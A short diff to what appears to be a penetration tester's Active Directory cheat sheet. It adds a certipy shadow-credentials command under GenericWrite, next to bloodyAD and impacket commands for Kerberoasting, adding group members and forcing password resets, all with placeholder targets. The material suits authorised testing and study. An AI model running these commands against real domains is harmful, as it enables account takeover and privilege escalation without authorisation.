@@ -483,6 +483,7 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedNam
 +---------- GenericWrite ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
 
 +---------- ForceChangePassword ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
